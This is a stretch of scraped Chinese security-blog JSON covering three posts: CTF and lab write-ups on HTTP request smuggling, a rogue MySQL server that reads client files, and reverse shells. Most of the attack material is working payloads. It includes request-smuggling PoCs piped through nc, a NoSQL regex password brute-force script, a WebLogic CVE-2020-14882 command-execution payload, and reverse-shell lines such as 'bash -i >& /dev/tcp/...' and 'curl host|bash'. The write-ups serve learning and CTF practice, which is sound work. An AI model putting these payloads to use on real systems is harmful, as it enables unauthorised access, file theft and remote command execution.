Hit，即只需连接Cache缓存服务器，不再连接到Server服务器，借此减少了Server服务器的运行负荷。\n这个正常情况下的话无疑是很好的，但如果被黑客利用，这个就会造成一些不好的影响，比如第一个人改了一些包，发送到后端，导致后端返回一些恶意数据，xss这种等等，同时由于缓存机制，后续的其他用户访问此界面时会加载这个恶意缓存，此时就造成了Web缓存投毒。\n接下来从题目中进行进一步理解。\n题目描述\n\n\n\n\n\n\n\n\n\n本实验涉及前端和后端服务器，前端服务器不支持分块编码。前端服务器被配置为缓存某些响应。\n题目要求\n\n\n\n\n\n\n\n\n\n为了解决实验室问题，请执行导致缓存中毒的请求走私攻击，以便随后对 JavaScript 文件的请求接收到对漏洞利用服务器的重定向。中毒的缓存应该发出警报document.cookie\n（经本地测试，这里弹cookie只有弹窗，但无内容，可能是因为cookie过长，所以这里采用弹1来演示缓存投毒）进入环境后抓包，我们首先来验证一下是否存在请求走私漏洞，本题的描述是前端不支持分块编码，那这里的话应该就是CL-TE种类的请求走私漏洞，我们构造一个恶意代码试下能否实现请求走私\nContent-Length: 135\\r\\n\nTransfer-Encoding: chunked\\r\\n\n\\r\\n\n0\\r\\n\n\\r\\n\nGET /post/next?postId=3 HTTP/1.1\\r\\n\nHost: quan9i.top\\r\\n\nContent-Type: application/x-www-form-urlencoded\\r\\n\nContent-Length: 10\\r\\n\n\\r\\n\nx=1\\r\\n\n\\r\\n\n\n第一次访问正常，再次访问302，并跳转到了我们构造的URL中，说明存在CL-TE请求走私，接下来找一个利用点(在靶场中存在的js文件就可以)，然后我们构造一个恶意代码，让下一个请求指向一个xss语句，再将这个利用点发出，这个时候就可以触发我们的xss语句在环境中我们发现了tracking.js这个文件，那么我们就可以让他重定向到xss语句，这样访问靶场的话就会触发，这个时候问题又来了，xss语句怎么搞呢，我们其实只需要让他定向到一个有恶意xss语句的界面就可以，这个时候我们看见靶场里提供了一个工具我们修改路径为post，内容为alert(1)，这时候我们利用CL-TE请求走私就可以将下一请求指向这个POST路径，那结合刚刚的js文件，就可以触发xss这个时候访问正常，接下来正常情况就是访问到我们构造的恶意xss了，此时我们get发包，将js语句发出去成功重定向，可以看到这里指向的是我们构造的恶意xss语句，访问一下也可以看出来此时去访问靶场，就可以触发xss，请求走私投毒成功\n走私攻击实例gunicorn 20.0.4 请求走私漏洞在复现漏洞之前，先简述一下其漏洞成因。\n在文件/gunicorn/http/message.py中存在函数set_body_reader，这个函数通过请求头来确定请求正文的大小，如果存在请求头中存在Sec-Websocket-Key1，则指定这里的请求内容长度为8。如果 gunicorn 位于代理后面并使用持久连接与其通信（HTTP 1.1 中的默认设置），就会造成这个请求走私漏洞。现有如下请求发送到从Internet发送到Proxy处\nGET / HTTP/1.1\nHost: example.com\nContent-Length: 48\nSec-Websocket-Key1: x\n\nxxxxxxxxGET /other HTTP/1.1\nHost: example.com\nProxy代理代理看到Content-Length: 48，认为数据没有问题，然后将内容传输给后端gunicorn处，当请求到达gunicorn处时，他看到Sec-Websocket-Key1时，只会读取八个字符，也就是后面的xxxxxxxx，此时这部分代码还在缓冲区\nGET /other HTTP/1.1\nHost: example.com\n由于proxy代理和 gunicorn 使用 HTTP-keep-alive 通信，gunicorn 将继续通过与下一个请求相同的 TCP 连接读取这部分数据。 因此，这部分数据发生了请求走私（与CL-TE类请求走私漏洞类似）。\n环境搭建环境搭建的话，有师傅已经搭建好了，然后这里需要简单说明一下。\n\n\n\n\n\n\n\n\n\n注：这个师傅搭建的9999端口是haproxy代理，5000端口是gunicorn业务其实也就是说，9999端口是前端代理服务器，5000端口是后端服务器（原站）\n具体环境搭建代码如下\n1、git clone https://github.com/cckuailong/gunicorn_request_smuggling\n2、cd gunicorn_request_smuggling\n3、docker-compose up --build\n这个时候环境就搭建好了。\ngunicorn正常的响应：\n$ curl http://localhost:5000/\nINDEX\n$ curl http://localhost:5000/forbidden\nFORBIDDEN\n$ curl http://localhost:5000/admin\nADMIN\nhaproxy代理正常的响应\n$ curl http://localhost:9999/\nINDEX\n$ curl http://localhost:9999/forbidden\nFORBIDDEN\n$ curl http://localhost:9999/admin\nFORBIDDEN\n接下来我们尝试一下通过请求走私访问gunicorn的admin文件\nPoc如下前端代理服务器认为这是两个请求，即\nGET / HTTP/1.1\nHost: localhost\nContent-Length: 68\nSec-Websocket-Key1: x\n\nxxxxxxxxGET /admin HTTP/1.1\nHost: localhost\nContent-Length: 35\n和\nGET / HTTP/1.1\nHost: localhost\n\necho -en \"GET / HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 68\\r\\nSec-Websocket-Key1: x\\r\\n\\r\\nxxxxxxxxGET /admin HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 35\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n\" | nc localhost 9999 \n可以看到成功访问到了禁止访问的admin界面并获取到了内容。对这个Poc进行一下拆分，他是这个样子的\nGET / HTTP/1.1\\r\\n\nHost: localhost\\r\\n\nContent-Length: 68\\r\\n\nSec-Websocket-Key1: x\\r\\n\n\\r\\n\n\\r\\n\nxxxxxxxxGET /admin HTTP/1.1\\r\\n\nHost: localhost\\r\\n\nContent-Length: 35\\r\\n\n\\r\\n\n\\r\\n\nGET / HTTP/1.1\\r\\n\nHost: localhost\\r\\n\n这个的话如同我们上面所说，类似于CL-TE，gunicorn认为这是两个请求\nGET / HTTP/1.1\\r\\n\nHost: localhost\\r\\n\nContent-Length: 68\\r\\n\nSec-Websocket-Key1: x\\r\\n\n\\r\\n\n\\r\\n\nxxxxxxxx\n和\nGET /admin HTTP/1.1\\r\\n\nHost: localhost\\r\\n\nContent-Length: 35\\r\\n\n\\r\\n\n\\r\\n\nGET / HTTP/1.1\\r\\n\nHost: localhost\\r\\n\n这个时候就导致了请求走私漏洞，访问到了本该拦截的/admin请求\nNginx error_page 请求走私漏洞(CVE-2019-20372)Nginx 1.17.7之前版本中 error_page 存在安全漏洞。攻击者可利用该漏洞读取未授权的Web页面。\n漏洞的成因是Nginx1.17.7 及之前版本具有 error_page 配置，它不使用 error_page 进行 302 重定向。它仅使用 error_page 使用命名位置，如\nerror_page 404 /404.php；\n此时攻击者能够在 NGINX 由负载均衡器前端的环境中读取未经授权的网页，就造成了请求走私攻击。这里可以参考Vow大师傅给出的存在漏洞的配置\nserver &#123;\n listen 80;\n server_name localhost;\n error_page 401 http://example.org;\n location / &#123;\n return 401;\n &#125;\n&#125;\nserver &#123;\n listen 80;\n server_name notlocalhost;\n location /_hidden/index.html &#123;\n return 200 'This should be hidden!';\n &#125;\n&#125;\n此时我们构造如下请求\nGET /a HTTP/1.1\nHost: localhost\nContent-Length: 56\nGET /_hidden/index.html HTTP/1.1\nHost: notlocalhost\n服务器就会认为这是两个请求。\n得到的回显如下\nHTTP/1.1 302 Moved Temporarily\nServer: nginx/1.17.6\nDate: Fri, 06 Dec 2019 18:23:33 GMT\nContent-Type: text/html\nContent-Length: 145\nConnection: keep-alive\nLocation: http://example.org\n&lt;html>\n&lt;head>&lt;title>302 Found&lt;/title>&lt;/head>\n&lt;body>\n&lt;center>&lt;h1>302 Found&lt;/h1>&lt;/center>\n&lt;hr>&lt;center>nginx/1.17.6&lt;/center>\n&lt;/body>\n&lt;/html>\nHTTP/1.1 200 OK\nServer: nginx/1.17.6\nDate: Fri, 06 Dec 2019 18:23:33 GMT\nContent-Type: text/html\nContent-Length: 22\nConnection: keep-alive\nThis should be hidden!\n请求走私攻击成功。\nNginx&lt;=1.18.0请求走私漏洞(CVE-2020-12440)Nginx&lt;=1.18.0及之前版本中存在安全漏洞。攻击者可利用该漏洞进行缓存投毒，劫持凭证或绕过安全保护。\n漏洞简述他这里存在CL!=0请求走私漏洞，我们构造恶意代码可同时发送两个请求并收到回显，我们构造请求如下\nGET /test.html HTTP/1.1\nHost: localhost\nContent-Length: 2\n\nGET /poc.html HTTP/1.1\nHost: localhost\nContent-Length: 15\n\n\n\n\n\n\n\n\n\n\n注:test.html中的内容为&lt; html&gt;&lt; h1&gt;Test Page!&lt; /h1&gt;&lt; /html&gt;        poc.html中的内容为NGINX PoC File\n请求走私成功，成功访问到了poc.html\nCTF实战[RoarCTF 2019]Easy Calc靶机地址https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Calc访问界面发现是一个计算器，输入数字和字符可以计算出结果看眼源代码发现一个文件，访问一下发现这里ban了一些字符，但经过测试其实还ban了所有字母这些（属于是前端WAF），那么想要绕过的话这里就可以尝试HTTP请求走私，当我们构造请求走私，让前端报错的时候，这时候就可以直接绕过前端的waf，现在尝试一下CL-CL种类绕过。\n抓包，修改请求方法为POST方法再添加一个Content-Length头，使得前端报错，同时认为这是两个请求，图示如下而后我们在disable_functions中看到很多函数都被禁用了那么我们这里就用一些其他命令执行的函数来进行绕过读取文件目录用scandir读取根目录，虽然不能直接读取.，但是我们这里可以用chr()函数+ascii码值来进行绕过，构造payload\nnum=var_dump(scandir(chr(47)))\n接下来用show_source读取根目录的flagg文件\nnum=show_source((chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))\n然后这个的话是一种方法，我们也可以利用CL-TE方式让前端报错，进而绕过WAF实现RCE，图示如下TE-TE亦可\n[GKCTF 2021]hackme题目地址如下https://buuoj.cn/challenges#[GKCTF%202021]hackme题目提示如下\n\n\n\n\n\n\n\n\n\n1、你可能需要unicode2、注意server和其配置文件\n进入环境后发现是登录框，先不急着去尝试注入，看看源代码有没有什么提示提示nosql，说明这里很大可能是nosql注入，师傅们如果想了解nosql可以简单参考下这篇文章https://blog.szfszf.top/tech/nosql抓包发现这里是json格式我们用永真式尝试绕过\n&#123;\"username\":&#123;\"$ne\":1&#125;,\"password\":&#123;\"$ne\":1&#125;&#125;\n被检测出来了，想起来提示中说unicode编码，我们这里尝试编码一下看是否能绕过这里的话就发现了两种状态即\n&#123;\"msg\":\"登录失败\"&#125;\n&#123;\"msg\":\"登录了，但没完全登录\"&#125;\n因此这里可以借助regexp盲注来获取正确密码，脚本如下所示\nimport requests\nimport string\n \npassword = ''\nurl = 'http://node4.buuoj.cn:29402/login.php'\n \n#盲注当知道了用户名后就可以用正则$regex来爆破密码\nwhile True:\n    for c in string.printable:\n        if c not in ['*', '+', '.', '?', '|', '#', '&amp;', '$']:\n \n            # When the method is GET\n            get_payload = '?username=admin&amp;password[$regex]=^%s' % (password + c)\n            # When the method is POST\n            post_payload = &#123;\n                \"username\": \"admin\",\n                \"password[$regex]\": '^' + password + c\n            &#125;\n            # When the method is POST with JSON\n            json_payload = \"\"\"&#123;\"username\":\"admin\", \"password\":&#123;\"\\\\u0024\\\\u0072\\\\u0065\\\\u0067\\\\u0065\\\\u0078\":\"^%s\"&#125;&#125;\"\"\" % (password + c)\n            headers = &#123;'Content-Type': 'application/json'&#125;\n            r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json\n \n            #r = requests.post(url=url, data=post_payload)\n            if '但没完全登录' in r.content.decode():\n                password += c\n                print(password)\n最终得到正确密码42276606202db06ad1f29ab6b4a1307f登录发现一个读取文件的文件框，抓包尝试一下任意文件读取尝试读取flag提示flag在内网，此时想到题目的提示注意server和其配置文件，查看一下info.php看是否有可利用信息看到使用的是nginx，接下来查看nginx配置文件/usr/local/nginx/conf/nginx.conf发现存在weblogic服务同时我们发现nginx的版本号是1.17.6，Nginx 1.17.7之前版本中 error_page可能存在安全漏洞，我们可以借此来查看weblogic版本号，构造请求如下\nGET /a HTTP/1.1\nHost: node4.buuoj.cn:28946\nContent-Length: 66\n\nGET /console/login/LoginForm.jsp HTTP/1.1\nHost: weblogic\n这里我用bp打并未得到正确回显，但是我看到一位大师傅用socket脚本打出来了，脚本如下\nimport socket\n\nsSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsSocket.connect((\"node4.buuoj.cn\", 28946))\npayload = b'GET /a HTTP/1.1\\r\\nHost: node3.buuoj.cn\\r\\nContent-Length: 66\\r\\n\\r\\nGET /console/login/LoginForm.jsp HTTP/1.1\\r\\nHost: weblogic\\r\\n\\r\\n'\nsSocket.send(payload)\nsSocket.settimeout(2)\nresponse = sSocket.recv(2147483647)\nwhile len(response) > 0:\n    print(response.decode())\n    try:\n        response = sSocket.recv(2147483647)\n    except:\n        break\nsSocket.close()\n得到weblogic版本号12.2.1.4.0，而这个版本存在漏洞(CVE-2020-14882)，借此漏洞即可获取flag，这里借用一位大师傅的socket脚本\nimport socket\n\nsSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsSocket.connect((\"node4.buuoj.cn\", 28946))\npayload = b'HEAD / HTTP/1.1\\r\\nHost: node4.buuoj.cn\\r\\n\\r\\nGET /console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]&#123;%22cmd.exe%22,%20%22/c%22,%20cmd&#125;%20:%20new%20String[]&#123;%22/bin/sh%22,%20%22-c%22,%20cmd&#125;;if(cmd%20!=%20null%20)&#123;%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125;%20currentThread.interrupt(); HTTP/1.1\\r\\nHost:weblogic\\r\\ncmd: /readflag\\r\\n\\r\\n'\n#payload = b'GET /a HTTP/1.1\\r\\nHost: node3.buuoj.cn\\r\\nContent-Length: 66\\r\\n\\r\\nGET /console/login/LoginForm.jsp HTTP/1.1\\r\\nHost: weblogic\\r\\n\\r\\n'\nsSocket.send(payload)\nsSocket.settimeout(2)\nresponse = sSocket.recv(2147483647)\nwhile len(response) > 0:\n    print(response.decode())\n    try:\n        response = sSocket.recv(2147483647)\n    except:\n        break\nsSocket.close()\n脚本运行完即可获取flag，而这个是预期解，针对这题还有另一个解法，可以参考这位大师傅的这篇文章https://laotun.top/2021/09/27/gkctf\nISCC2022[让我康康]提示框给了提示是Try flag，访问flag后回显访问此界面回显403，服务器发送请求看一下发现服务是gunicorn 20.0.4，这个是存在请求走私漏洞的，因此我们这里就可以构造请求去访问本被禁止访问的fl4g文件构造请求如下\necho -en \"POST / HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 76\\r\\nSec-Websocket-Key1: x\\r\\n\\r\\nxxxxxxxxPOST /fl4g HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 55\\r\\n\\r\\nPOST / HTTP/1.1\\r\\nHost: 127.0.0.1:80\\r\\n\\r\\n\" | nc 59.110.159.206 7020\n对此部分进行拆分，就是\nPOST / HTTP/1.1\\r\\n\nHost: localhost\\r\\n\nContent-Length: 76\\r\\n\nnSec-Websocket-Key1: x\\r\\n\n\\r\\n\nxxxxxxxxPOST /fl4g HTTP/1.1\\r\\n\nHost: localhost\\r\\n\nContent-Length: 55\\r\\n\n\\r\\n\nPOST / HTTP/1.1\\r\\n\nHost: 127.0.0.1:80\\r\\n\n\\r\\n\n此时后端服务器就会认为这是两个请求，即\nPOST / HTTP/1.1\\r\\n\nHost: localhost\\r\\n\nContent-Length: 76\\r\\n\nnSec-Websocket-Key1: x\\r\\n\n\\r\\n\nxxxxxxxx\n和\nPOST /fl4g HTTP/1.1\\r\\n\nHost: localhost\\r\\n\nContent-Length: 55\\r\\n\n\\r\\n\nPOST / HTTP/1.1\\r\\n\nHost: 127.0.0.1:80\\r\\n\n\\r\\n\n按理说就可以访问到f14g，但此时回显需要本地访问，因此我们添加secr3t_ip:127.0.0.1\\r\\n，伪造本地ip\necho -en \"GET / HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 90\\r\\nSec-Websocket-Key1: x\\r\\n\\r\\nxxxxxxxxGET /fl4g HTTP/1.1\\r\\nHost: localhost\\r\\nsecr3t_ip:127.0.0.1\\r\\nContent-Length: 55\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: 127.0.0.1:80\\r\\n\\r\\n\" | nc 59.110.159.206 7020\n请求拆分后如下\nGET / HTTP/1.1\\r\\n\nHost: localhost\\r\\n\nContent-Length: 90\\r\\n\nSec-Websocket-Key1: x\\r\\n\n\\r\\n\nxxxxxxxxGET /fl4g HTTP/1.1\\r\\n\nHost: localhost\\r\\n\nsecr3t_ip:127.0.0.1\\r\\n\nContent-Length: 55\\r\\n\n\\r\\n\nGET / HTTP/1.1\\r\\n\nHost: 127.0.0.1:80\\r\\n\n\\r\\n\n成功获取到flag\n后言发现还有两道很有意思的请求走私题，那就是Bytectf2021 A-ginx1/2，但是这个题涉及了多个知识点，我是个菜狗，目前还在学习中，故暂时不能作为CTF例题讲解，师傅们如果有兴趣的话可以看这两篇文章，大师傅们都很厉害，写的也非常好。https://tttang.com/archive/1396/https://impakho.com/post/bytectf-2021-aginx-writeup\n最后，本人只是一个小白，在学习请求走私过程中也可能会出现问题，同时Nginx的请求走私漏洞在学习中并没有复现出来，我参考了其他大师傅的文章后进行了简单总结，没有自己进行测试，所以这个也可能出现问题，还请各位大师傅多多指教。\n参考文献https://websec.readthedocs.io/zh/latest/vuln/httpSmuggling.htmlhttps://paper.seebug.org/1048/#52https://v0w.top/2020/12/20/HTTPsmugglinghttps://xz.aliyun.com/t/7501#toc-10https://xz.aliyun.com/t/6654#toc-6https://xz.aliyun.com/t/11423#toc-5https://www.4hou.com/posts/JXK2https://xz.aliyun.com/t/11728#toc-17https://xz.aliyun.com/t/6631#toc-5https://www.anquanke.com/post/id/246516#h3-30https://www.anquanke.com/post/id/210036#h3-11https://forum.butian.net/share/1876https://juejin.cn/post/6997215152533667876https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/#golanghttps://blog.fundebug.com/2019/09/10/understand-http-content-length/https://www.yiyayiyawu.cn/archives/httphttps://www.freebuf.com/articles/web/334057.htmlhttp://1.116.103.114/hole/CVE-2020-12440\n","slug":"初探HTTP请求走私","date":"2022-11-02T17:41:30.000Z","categories_index":"WEB知识","tags_index":"HTTP请求走私","author_index":"quan9i"},{"id":"5a86b73daf28f7e8c8ac977d8c647c4e","title":"初探Mysql反向读取文件","content":"声明文章首发于FreeBuf社区https://www.freebuf.com/articles/web/348248.html\n前言Mysql反向读取文件感觉蛮有意思的，进行了解过后，简单总结如下，希望能对在学习Mysql反向读取文件的师傅有些许帮助。\n前置知识在Mysql中存在这样一条语句\nLOAD DATA INFILE\n它的作用是读取某个文件中的内容并放置到要求的表中，具体的话又分为两种\n1、load data infile \"C:/Windows/win.ini\" into table test FIELDS TERMINATED BY '\\n';\n2、load data local infile \"C:/Windows/win.ini\" into table test FIELDS TERMINATED BY '\\n';\n第一个语句是读取服务端本地的win.ini文件而后插入到test表中第二个语句是读取客户端的win.ini文件而后插入到test表中而这个也就是Mysql实现反向读取文件的关键点。\n环境搭建环境准备\n\n\n\n\n\n\n\n\n\n客户端 Win11 192.168.134.1服务端 Kali  192.168.134.132\n这个还有一个先决条件，就是需要\n\n\n\n\n\n\n\n\n\n服务端开启 Load data infile \n师傅们可以通过如下语句来查询是否开启 Load data infile，\nKali自带Mysql服务，所以我们只需要开启一下就好，指令如下\nservice mysql start\n\n接下来需要开启一下允许远程连接，因为默认的话是只允许本机连接mysql的，具体指令如下\n1、use mysql\n//使用mysql数据库\n2、GRANT ALL PRIVILEGES ON *.* TO 'myuser'@'%'IDENTIFIED BY 'root' WITH GRANT OPTION\n//允许任意主机以root为密码登录，这里密码是我默认的密码，如果师傅们更改密码的话需要更改root为自己的密码\n3、flush privileges\n//刷新权限\n此时环境就大致准备好了。\ndemo刚刚已经在服务端开启过Mysql服务，接下来尝试本地连接(打开wireshark准备抓包)，指令如下\nmysql -u root -p -h 192.168.134.132\n成功连接，接下来利用刚刚学习的语句，来传一个文件\nload data local infile \"C:/Windows/win.ini\" into table test FIELDS TERMINATED BY '\\n';\n//加载客户端的win.ini文件到服务端的test表中\n接下来看Wireshark\n流量分析可以看到这里的话首先是一个Sever Greeting包返回了服务端的协议号、版本号和salt值等信息，接下来看第二个包这个应该是客户端的登录包，返回了用户名和登录密码的哈希值\n再往下看这个是登录包，接下来的就是正常的语句查询了然后就是查询语句的回显结果的包接下来分析一下读取文件的流量包，在Mysql命令行执行语句过后，得到流量包首先是客户端发送查询服务端返回了需要的路径这里可以看出来读取文件成功，同时可以看出文件是由客户端发送到服务端的，那么我们能不能控制这个文件，实现服务端恶意读取其他文件呢？我们先来分析一下正常流程\n1、客户端:将Win.ini文件插入到表test中\n2、服务端:读取Win.ini文件内容\n3、客户端:Win.ini内容为xxx\n而我们想实现的流程是\n1、客户端:我想查看当前数据库(任何指令皆可)\n2、服务端:读取flag.php文件内容\n3、客户端:flag.php内容为xxx\n那么这个可不可行呢？其实是可行的。那么这里想实现恶意的读取文件的话，其实我们可以伪造一个假的Mysql服务，当客户端请求连接时，我们运行连接，然后无论对方输入什么密码都可以连接，接下来向客户端发送读取文件要求，然后等客户端发送文件即可，具体过程如下所示\n1、服务端向客户端发送Greeting包\n2、客户端向服务端发送请求以root身份登录\n3、服务端运行客户端登录\n4、客户端向服务端发送查询版本号等信息请求\n5、服务端向客户端请求'C:\\windows\\system32\\drivers\\etc\\hosts'文件内容\n6、客户端向服务端发送该文件内容\n7、服务端成功接收，向客户端返回响应包\n那么我们伪造的Mysql服务需要做些什么此时就显而易见了\n1、需要构造一个Greeting包发送给客户端\n2、需要允许用户以任意密码登录，然后给予一个响应\n3、需要构造一个TABULAR包发给客户端（将想要读取的文件名发给客户端）\n4、接收文件内容后发送一个响应包\n这里的话不对如何构造Gretting包和TABULAR包进行讲解，师傅们若想自己构造可以参考crow大师傅的这篇文章https://cloud.tencent.com/developer/article/1856248里面对如何构造进行了较为细致的讲解。这里利用大佬写好的脚本来试一下，脚本链接如下https://github.com/allyshka/Rogue-MySql-Server/blob/master/rogue_mysql_server.py首先需要修改一下脚本查看的文件，因为我们的客户机是Windows环境，而原脚本读取的是Linux环境下的文件，所以需要稍作修改将filelist修改为c:\\windows\\system32\\drivers\\etc\\hosts启动脚本接下来用nmap查看端口是否开启\nnmap -sS -p- 192.168.134.132 \n可以看到端口已经开启，接下来就可以尝试用Navicat进行连接尝试(空密码即可，因为这本就是一个不存在的Mysql服务，只是一个恶意服务端)接下来就可以发现服务端的当前路径下多了一个mysql.log，文件，查看一下成功获取到文本内容接下来结合Wireshark分析一下流量看与我们设想是否一致可以发现跟我们之前所想是相同的，接下来试一下Mysql命令行连接Mysql恶意服务，分析流量有什么不同可以看到过程其实都是一致的，不同点就在于Mysql命令行连接过恶意服务后请求的是查看版本号等信息，而Navicat请求的是set names utf 8mb4来获取指纹等信息\n参考文献https://www.cnblogs.com/Rain99-/p/13334755.htmlhttps://lightless.me/archives/read-mysql-client-file.htmlhttps://cloud.tencent.com/developer/article/1856248https://www.freebuf.com/articles/web/247976.htmlhttps://xz.aliyun.com/t/11631#toc-12https://www.cnblogs.com/apossin/p/10127496.htmlhttps://mp.weixin.qq.com/s/rQ9BpavBeMnS6xUOidZ5OAhttp://www.qwzf.top/https://cloud.tencent.com/developer/article/1582296https://github.com/allyshka/Rogue-MySql-Server/blob/master/rogue_mysql_server.pyhttps://www.xiinnn.com/article/424ded82.htmlhttps://www.jianshu.com/p/3d26180268d7https://www.jianshu.com/p/f0e2dfe35be7\n","slug":"初探Mysql反向读取文件","date":"2022-10-29T06:55:30.000Z","categories_index":"Mysql","tags_index":"蜜罐","author_index":"quan9i"},{"id":"3f5a0e228fd5b85476b92a268c8b102a","title":"从一道题目中学习反弹shell","content":"前言最近在帮一位大师傅测试招新赛的时候，发现自己对反弹shell是不太了解的，因此在用反弹shell解题过后，来对反弹shell进行相关学习，希望对各位师傅有所帮助。\n题目首先这里给出题目代码\n&lt;?php\nif(isset($_GET['cmd']))&#123;\n    $cmd=$_GET['cmd'];\n    if(!preg_match(\"/\\;|\\&amp;|\\\\$|\\x09|\\x26|\\`|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i\", $cmd))&#123;\n        shell_exec($cmd);\n    &#125;\n    else&#123;\n        echo \"NoNoNo\";\n    &#125;\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125;\n?>\n这里可以看出是命令执行类的题目，但是一些关键词被ban了，例如php被ban，因此这里的话想用PHP://伪协议读取flag就不行了，想写一句话木马的话虽然可以用=代替php，但因为这里$了，所以也不行，那么这里的思路我的话感觉是还有两种，一种是利用重定向符，他这里输出是无回显的，我们可以把他写到一个文件中，然后访问这个文件来查看回显，因此payload如下\ncmd=ls />a\n接下来访问xxx/a(flag在这里，截图的时候没注意，导致没把flag截出来)此时发现flag在根目录下，再用一下查看文件的命令重定向到a，本来是这样就可以了，但是这里我们发现ban了flag关键字，所以没办法直接cat flag &gt;a,但是我们知道还有通配符，f*可以表示flag，因此payload如下\ncmd=cat /f*>a\n还有一种方法，就是我想说的方法了，即反弹Shell，反弹Shell这个我之前用的都是nc命令，这里我构造payload如下来尝试反弹Shell\ncmd=nc -e ip/port 7777\n但是没有反弹上来，可能是缺少了nc环境因此这里的话只好再找另一个语句，后来想到用这个语句bash -i&gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/7777 0&gt;&amp;1,但是这里ban了&amp;,导致我们不能够直接进行反弹shell，这个时候看到curl没有被ban,我们可以利用curl来实现(原理后面讲，这里先说一下利用方式)，具体如下\ncurl xxx:xxx:xxx:xxx:port|bash\n而我们的服务器下的内容为\nbash -i>&amp; /dev/tcp/xxx.xxx.xxx.xxx/7777 0>&amp;1\n\n这样就成功绕过了&amp;同时实现反弹shell。\n\n\n\n\n\n\n\n\n\n这里在做的时候需要服务器先监听7777端口，再执行语句\n发现flag成功读取flag\n反弹shell定义什么是反弹shell？原词为reverse shell，含义如下\n\n\n\n\n\n\n\n\n\n控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。\n其本质就是实现客户端与服务端的互换\n利用原因初学时我们不禁有这样的疑问，为什么我们要用反弹shell呢？我们时候利用反弹shell呢？解释如下\n\n\n\n\n\n\n\n\n\n为什么要用反弹shell\n这里不以CTF举例，以相对更真实一点的渗透过程来举例，比如你作为攻击方，成功向目标处上传了木马文件，可以执行一些语句，我们想获取一个可以直接操作主机的虚拟终端，这个时候就需要利用反弹shell了，因为反弹shell后才可以操作主机。这里借用安全客myles007大师傅的图来展示一下，这样可能会更生动易懂一些那么这个问题解决了，接下来我们看下一个问题\n\n\n\n\n\n\n\n\n\n什么时候用反弹shell\n我认为的话就是以下两种情况\n1、其环境是不稳定的，可能过段时间环境会变好(动态环境)\n2、目标机无法接受请求，但是可以发送请求\n在一位大师傅的文章中，我学习到了其他利用反弹shell的场景(引用于https://xz.aliyun.com/t/2549)\n\n\n\n\n\n\n\n\n\n1、由于防火墙等限制，对方机器只能发送请求，不能接收请求。2、它的ip会动态改变，你不能持续控制。3、某客户机中了你的网马，但是它在局域网内，你直接连接不了。4、对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。\n对于场景1来解释一下，就是这个时候，攻击机监听一个端口，目标机主动发送请求给攻击机的这个监听端口，这时候就实现了反弹连接\n常见的反弹Shell语句原理Ncnc，全称是Netcat,使用的是UDP和TCP协议，它可以相对较简单的建立一些连接，接下来了解一下要用到的参数\n-l 使用监听模式，管控传入的资料。\n-v 显示指令执行过程。\n-n 直接使用IP地址，而不通过域名服务器。\n-p&lt;通信端口> 设置本地主机使用的通信端口。\n这几个参数常用于监听，也就是攻击机使用的，当目标机主动连接我们的攻击机时，我们需要监听这个端口来实现获取shell，具体指令的话就是\nnc -lvnp 7777 //任意端口，没被占用即可(如果不行记得看看防火墙是否开启了对应端口)\n\n接下来还有一个参数，很重要的一个参数，也就是-e，其解释如下\n-e, --exec=PROGRAM         program to exec after connect\n这个是啥意思呢，其实就是说在连接过后会执行程序，这个是为了我们连接后能够输入指令做准备，它是用于目标机的，由于目标机能够发送请求，所以我们让他通过nc指令和e参数，来向攻击机发送请求，把bash(一种shell)给发送出去，这样就实现了反弹shell\ndemo攻击机：监听端口7777，指令如下\nnc-lvnp 7777\n\n目标机:发送请求，将bash弹给攻击机\nnc xxx.xxx.xxx.xxx 7777 -e /bin/bash\n\n可以发现成功连接，可以执行指令。\nBashBash，全称Bourne Again shell,是一种shell，我们利用它来进行反弹shell的时候，常见的是将它与重定向符结合，指令如下\nbash -i>&amp; /dev/tcp/xxx.xxx.xxx.xxx/7777 0>&amp;1\n对于这个该怎么去理解呢首先我们了解一下-i参数，-i的话是指交互模式，那bash -i的话就是打开一个交互环境接下来看&gt;&amp;，拆分来看，先看&gt;对于linux简单了解一下，可以知道这里的&gt;是重定向符，前面的语句会被写入到后面，比如echo 